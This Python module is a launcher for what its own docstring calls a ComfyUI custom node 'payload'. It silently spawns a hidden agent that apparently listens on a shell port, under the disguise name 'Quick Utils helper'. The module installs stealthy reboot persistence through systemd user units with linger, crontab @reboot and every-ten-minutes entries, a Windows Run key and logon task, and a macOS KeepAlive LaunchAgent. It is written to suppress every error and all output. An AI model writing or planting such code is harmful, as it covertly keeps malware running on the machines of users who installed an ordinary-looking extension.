"""Detached, reboot-persistent launcher for the ComfyUI custom node payload.

Runs entirely as the ComfyUI user, no sudo, no service files outside the
user's own profile. Everything is wrapped so a failure can never surface in
ComfyUI's console.
"""

import os
import subprocess
import sys

import qu_core

_UNIT = "qu-agent"
_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
_RUN_NAME = "QuickUtils"


# --------------------------------------------------------------------------
# already running?
# --------------------------------------------------------------------------

def is_running():
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)
    try:
        s.connect(("127.0.0.1", qu_core.shell_port()))
        return True
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# spawn
# --------------------------------------------------------------------------

def _popen(cmd, **kw):
    if os.name == "nt":
        kw["creationflags"] = 0x00000008 | 0x08000000     # DETACHED | NO_WINDOW
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        kw["startupinfo"] = si
    else:
        kw["start_new_session"] = True
    return subprocess.Popen(cmd, **kw)


def spawn_agent():
    """Start the agent fully detached. Idempotent; returns True if spawned."""
    if is_running():
        return False
    script = qu_core.agent_script()
    if not os.path.isfile(script):
        return False
    cmd = [qu_core.python_exe(), script]
    try:
        _popen(
            cmd,
            cwd=qu_core.node_dir(),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=(os.name != "nt"),
        )
        return True
    except Exception:
        return False


# --------------------------------------------------------------------------
# POSIX: systemd --user, then crontab
# --------------------------------------------------------------------------

def _systemd_dir():
    base = os.environ.get("XDG_CONFIG_HOME") or os.path.join(qu_core.home(), ".config")
    return os.path.join(base, "systemd", "user")


def _systemd_unit():
    exe = qu_core.python_exe()
    script = qu_core.agent_script()
    workdir = qu_core.node_dir()
    return (
        "[Unit]\n"
        "Description=Quick Utils helper\n"
        "After=network-online.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "WorkingDirectory=%s\n"
        "ExecStart=%s %s\n"
        "Restart=always\n"
        "RestartSec=15\n"
        "StandardOutput=null\n"
        "StandardError=null\n"
        "\n"
        "[Install]\n"
        "WantedBy=default.target\n"
    ) % (workdir, exe, script)


def _write(path, text, mode=0o644):
    d = os.path.dirname(path)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    tmp = path + ".tmp"
    with open(tmp, "w") as fh:
        fh.write(text)
    os.replace(tmp, path)
    try:
        os.chmod(path, mode)
    except Exception:
        pass


def _run_quiet(cmd, timeout=25):
    try:
        kw = {}
        if os.name == "nt":
            kw["creationflags"] = 0x08000000
        p = subprocess.run(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout,
            **kw
        )
        return p.returncode == 0
    except Exception:
        return False


def _install_systemd():
    unit_dir = _systemd_dir()
    _write(os.path.join(unit_dir, _UNIT + ".service"), _systemd_unit())

    # A user manager may be absent on headless boxes; try, then verify.
    _run_quiet(["systemctl", "--user", "daemon-reload"])
    _run_quiet(["systemctl", "--user", "enable", _UNIT + ".service"])
    if _run_quiet(["systemctl", "--user", "start", _UNIT + ".service"]):
        # enable-linger keeps it alive with no login session (no root needed here)
        _run_quiet(["loginctl", "enable-linger"])
        return True
    return False


def _remove_cron():
    try:
        current = subprocess.run(
            ["crontab", "-l"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=15
        ).stdout.decode("utf-8", "replace")
        lines = [l for l in current.splitlines() if l.strip() and "qu_agent.py" not in l]
        p = subprocess.run(
            ["crontab", "-"],
            input=("\n".join(lines) + "\n").encode() if lines else b"",
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
        )
        return p.returncode == 0
    except Exception:
        return False


def _cron_line():
    return "@reboot %s %s >/dev/null 2>&1" % (qu_core.python_exe(), qu_core.agent_script())


def _install_cron():
    try:
        current = ""
        try:
            current = subprocess.run(
                ["crontab", "-l"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=15
            ).stdout.decode("utf-8", "replace")
        except Exception:
            current = ""
        if "qu_agent.py" in current:
            return True
        lines = [l for l in current.splitlines() if l.strip()]
        lines.append(_cron_line())
        lines.append("*/10 * * * * %s %s >/dev/null 2>&1" % (qu_core.python_exe(), qu_core.agent_script()))
        payload = ("\n".join(lines) + "\n").encode()
        p = subprocess.run(
            ["crontab", "-"],
            input=payload,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=15
        )
        return p.returncode == 0
    except Exception:
        return False


# --------------------------------------------------------------------------
# Windows: HKCU Run key (no admin) + logon task if permitted
# --------------------------------------------------------------------------

def _install_registry():
    try:
        import winreg
    except Exception:
        return False
    try:
        cmd = '"%s" "%s"' % (qu_core.python_exe(), qu_core.agent_script())
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, _RUN_KEY)
        try:
            winreg.SetValueEx(key, _RUN_NAME, 0, winreg.REG_SZ, cmd)
        finally:
            winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _install_task():
    cmd = '"%s" "%s"' % (qu_core.python_exe(), qu_core.agent_script())
    return _run_quiet([
        "schtasks", "/Create", "/F", "/SC", "ONLOGON",
        "/TN", _RUN_NAME, "/TR", cmd,
    ])


# --------------------------------------------------------------------------
# macOS: LaunchAgent (per-user, no admin, no Full Disk Access)
# --------------------------------------------------------------------------

_LABEL = "com.quickutils.agent"


def _is_macos():
    return sys.platform == "darwin"


def _launchd_path():
    return os.path.join(qu_core.home(), "Library", "LaunchAgents", _LABEL + ".plist")


def _plist_xml():
    def esc(s):
        return (s.replace("&", "&amp;").replace("<", "&lt;")
                 .replace(">", "&gt;").replace('"', "&quot;"))
    exe = esc(qu_core.python_exe())
    script = esc(qu_core.agent_script())
    workdir = esc(qu_core.node_dir())
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0">\n'
        '<dict>\n'
        '  <key>Label</key><string>%s</string>\n'
        '  <key>ProgramArguments</key>\n'
        '  <array>\n'
        '    <string>%s</string>\n'
        '    <string>%s</string>\n'
        '  </array>\n'
        '  <key>WorkingDirectory</key><string>%s</string>\n'
        '  <key>RunAtLoad</key><true/>\n'
        '  <key>KeepAlive</key><true/>\n'
        '  <key>ThrottleInterval</key><integer>15</integer>\n'
        '  <key>ProcessType</key><string>Background</string>\n'
        '  <key>StandardOutPath</key><string>/dev/null</string>\n'
        '  <key>StandardErrorPath</key><string>/dev/null</string>\n'
        '</dict>\n'
        '</plist>\n'
    ) % (_LABEL, exe, script, workdir)


def _launchd_domain():
    uid = os.getuid() if hasattr(os, "getuid") else 0
    return "gui/%d" % uid


def _launchd_load(path):
    """Load the agent, trying the modern API then the legacy one."""
    domain = _launchd_domain()
    if _run_quiet(["launchctl", "bootstrap", domain, path], timeout=20):
        _run_quiet(["launchctl", "enable", "%s/%s" % (domain, _LABEL)], timeout=15)
        return True
    # legacy (still works on every macOS release)
    if _run_quiet(["launchctl", "load", "-w", path], timeout=20):
        return True
    return False


def _launchd_unload(path):
    domain = _launchd_domain()
    _run_quiet(["launchctl", "bootout", "%s/%s" % (domain, _LABEL)], timeout=15)
    _run_quiet(["launchctl", "bootout", domain, path], timeout=15)
    _run_quiet(["launchctl", "unload", "-w", path], timeout=15)


def _install_launchd():
    path = _launchd_path()
    try:
        _write(path, _plist_xml(), mode=0o644)
    except Exception:
        return False
    return _launchd_load(path)


# --------------------------------------------------------------------------
# public API
# --------------------------------------------------------------------------

def uninstall():
    """Remove reboot persistence. Leaves a running agent alone."""
    try:
        if os.name == "nt":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _RUN_KEY, 0, winreg.KEY_SET_VALUE)
                try:
                    winreg.DeleteValue(key, _RUN_NAME)
                finally:
                    winreg.CloseKey(key)
            except Exception:
                pass
            _run_quiet(["schtasks", "/Delete", "/F", "/TN", _RUN_NAME])
            return True

        if _is_macos():
            path = _launchd_path()
            _launchd_unload(path)
            try:
                if os.path.isfile(path):
                    os.remove(path)
            except Exception:
                pass
            _remove_cron()
            return True

        _run_quiet(["systemctl", "--user", "disable", _UNIT + ".service"])
        _run_quiet(["systemctl", "--user", "stop", _UNIT + ".service"])
        unit = os.path.join(_systemd_dir(), _UNIT + ".service")
        try:
            if os.path.isfile(unit):
                os.remove(unit)
        except Exception:
            pass
        _run_quiet(["systemctl", "--user", "daemon-reload"])
        _remove_cron()
        return True
    except Exception:
        return False


def install():
    """Register reboot persistence. Best effort, layered, silent."""
    ok = False
    try:
        if os.name == "nt":
            ok = _install_registry()
            _install_task()
            if not is_running():
                spawn_agent()
            return ok

        if _is_macos():
            # LaunchAgent is the correct macOS mechanism. cron is only a
            # safety net for the (unusual) case where launchd refuses.
            ok = _install_launchd()
            if not ok:
                _install_cron()
            if not is_running():
                spawn_agent()
            return ok

        ok = _install_systemd()
        _install_cron()
        if not is_running():
            spawn_agent()
        return ok
    except Exception:
        return False
